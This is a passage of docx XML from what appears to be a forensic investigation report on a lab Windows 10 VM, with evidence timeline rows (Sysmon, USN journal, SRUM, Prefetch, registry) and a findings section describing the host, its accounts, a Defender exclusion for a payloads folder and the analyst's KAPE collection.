          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\medmondson\AppData\Roaming\Microsoft\Windows\PowerShell\psreadline\ConsoleHost_history.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-008</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:38:59.162328</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 2 | Microsoft-Windows-Sysmon | A process changed a file creation time | ProcessID: 7024, ProcessGUID: e6e9f951-1652-654e-4302-000000000500 | RuleName: T1099 | Image: C:\Users\medmondson\Downloads\NDP452-KB2901954-Web.exe | TargetFilename: C:\26cf4c312f44da411cfc70a7b86d02\header.bmp | CreationTimeUTC: 2014-02-27 05:44:28.000 | PreviousCreationTimeUTC: 2023-11-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#19971</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:41:40.447180</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Desktop\Tools\Forensic_Program_Files\Live_Acquisition\Live_ Acquisition_Tools.7z</w:t>
              <w:br/>
              <w:t>FileCreate [Archive] entry=89237-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#143282</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:43:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (application resources)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: resource usage (end of period)</w:t>
              <w:br/>
              <w:t>\Device\HarddiskVolume4\Payloads\pscp.exe</w:t>
              <w:br/>
              <w:t>foreground read/written=4472832/0 background read/written=0/0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261019151050_SrumECmd_AppResourceUseInfo_Output.csv#519</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-008</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:43:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (network usage per application)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: network usage (end of period)</w:t>
              <w:br/>
              <w:t>\device\harddiskvolume4\windows\explorer.exe</w:t>
              <w:br/>
              <w:t>received=86237 sent=69181 IF_TYPE_ETHERNET_CSMACD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261019151050_SrumECmd_NetworkUsages_Output.csv#111</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-013, F-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:29:39.825781</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 255 | Microsoft-Windows-Sysmon</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23123</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-002</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:31:24.097276</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>GKAPE.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=820B4717 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#49</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\GKAPE.EXE-820B4717.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:sectPr>
          <w:pgSz w:w="15840" w:h="12240" w:orient="landscape"/>
          <w:pgMar w:top="1020" w:right="1134" w:bottom="1020" w:left="1134" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. Detailed findings</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 System context and scope</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Host DESKTOP-KJ81A5A (formerly OOBE name WIN-ELL0II3NDSJ), Windows 10 Pro build 18362, installed 2023-11-09 11:02:48 UTC, TZ Pacific (bias 480). Single active admin user medmondson (SID ...-1001). VMware VM with Intel 82574L NIC, one network profile; Samsung T7 USB SSD (E:) attached 10:45:39–11:40:19 UTC. Sysmon 15.1 installed 10:51:10 UTC (telemetry start), Defender exclusion C:\Payloads\ at 10:52:49 (to pivot later). KAPE/gkape collection 11:21–12:31 UTC from Desktop\Tools (excluded). Findings F-001 (system description) and F-002 (scope limits) recorded.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-001: System description: DESKTOP-KJ81A5A (Windows 10 Pro 1903 build 18362, lab VM, user medmondson)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artifact:defender (exclusions)</w:t>
              <w:br/>
              <w:t>artifact:prefetch</w:t>
              <w:br/>
              <w:t>artifact:raw.reg_networkadapters</w:t>
              <w:br/>
              <w:t>artifact:registry (recmd kroll)</w:t>
              <w:br/>
              <w:t>artifact:registry: accounts (sam)</w:t>
              <w:br/>
              <w:t>artifact:registry: known networks</w:t>
              <w:br/>
              <w:t>artifact:registry: profilelist</w:t>
              <w:br/>
              <w:t>artifact:registry: scsi</w:t>
              <w:br/>
              <w:t>artifact:registry: volumeinfocache</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-sysmon%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:system.evtx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2023-11-09 11:08:58.466478 → 2023-11-10 12:31:24.097276</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Host name DESKTOP-KJ81A5A (SYSTEM\ControlSet001\Control\ComputerName\ComputerName), workgroup (no domain observed). OS: Windows 10 Pro (EditionID Professional), CurrentBuild 18362; InstallDate/InstallTime 2023-11-09 11:02:48 UTC; RegisteredOwner medmondson. Time zone: Pacific Standard Time, ActiveTimeBias 480 min (UTC-8; local = UTC-8h). Pre-rename OOBE hostname WIN-ELL0II3NDSJ appears in EVTX (System 6005/6009 at 2023-11-09 18:58:21 UTC; 1074 RuntimeBroker.exe (WIN-ELL0II3NDSJ)). Boots/restarts: 6005 at 2023-11-09 19:00:23, 2023-11-10 10:08:24, 10:15:30 (after msiexec restart 1074), 10:42:09 (after restart 1074 at 10:41:51). Accounts (SAM): Administrator(500), Guest(501), DefaultAccount(503), WDAGUtilityAccount(504) all disabled; defaultuser0 (1000, disabled, OOBE); medmondson (RID 1001, SID S-1-5-21-1841083384-974204330-411256071-1001, Administrators, created 2023-11-09 11:08:58, last login 2023-11-10 10:42:23, 7 logons) – the only interactive profile (C:\Users\medmondson). Network: Intel 82574L Gigabit (VMware NIC) + Kernel Debug adapter; single known network profile "Network" first connected 2023-11-09 19:00:26 UTC, last 2023-11-10 11:07:13 UTC. Storage: VMware Virtual disk, VMware SATA CD, and Samsung PSSD T7 (USB SSD, volume E: label "SSD") first installed 2023-11-10 10:45:39, last connected 11:40:19 UTC. Sysmon 15.1 installed by the user at 2023-11-10 10:51:10 UTC with C:\Users\medmondson\Desktop\Tools\sysmon-config.xml (Sysmon EID 16 / EID 4) — Sysmon coverage therefore begins 10:51:11 UTC (EID1: 228, EID3: 33, EID11: 3487, EID22: 121, EID8: 3, EID5: 38). Defender path exclusion C:\Payloads\ (key mtime 2023-11-10 10:52:49 UTC). Collection: KAPE.EXE run 2023-11-10 11:21:49 and gkape.exe last run 2023-11-10 12:31:24 UTC (Prefetch), from C:\Users\medmondson\Desktop\Tools\Forensic_Program_Files\Live_Acquisition\...\KAPE — analyst/collection activity, excluded from findings. No Security 1102 / System 104 log-clear events.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Freshly installed lab VM (installed 2023-11-09), single administrative user medmondson. The analyst context ("a little dirty") is consistent with setup activity on 2023-11-09/10: Sysmon install at 10:51, forensic tools on Desktop\Tools, Samsung T7 USB SSD (probably tools/collection media), Defender exclusion for C:\Payloads\ (10:52:49 UTC, one minute after Sysmon install – likely lab staging of the payload, to be evaluated in later steps as it may relate to the malicious executable). Any activity before 10:51:11 UTC has no Sysmon process telemetry. KAPE/gkape and Sysmon installation are context, not attacker activity.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence (19)</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2023-11-09 19:00:23.673334</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Control\ComputerName\ComputerName</w:t>
              <w:br/>
              <w:t>System Info | System Info (Current) | ComputerName=DESKTOP-KJ81A5A</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#2177</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:10.376162</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ProductName=Windows 10 Pro</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#25</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:10.376162</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InstallDate=2023-11-09 11:02:48.0000000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:10.376162</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CurrentBuild=18362</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#31</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 18:58:05.585121</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Control\TimeZoneInformation</w:t>
              <w:br/>
              <w:t>System Info | System Time Zone Information | TimeZoneKeyName=Pacific Standard Time | Pacific Standard Time</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#2164</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 18:58:05.585121</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Control\TimeZoneInformation</w:t>
              <w:br/>
              <w:t>System Info | System Time Zone Information | ActiveTimeBias=480 | 480</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#2165</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:08:58.466478</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: accounts (SAM)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Account created</w:t>
              <w:br/>
              <w:t>medmondson RID=1001 logons=7 groups=Administrators</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261019151050/recmd_kroll_C_UserAccounts.csv#5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:41:53.368481</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: ProfileList</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
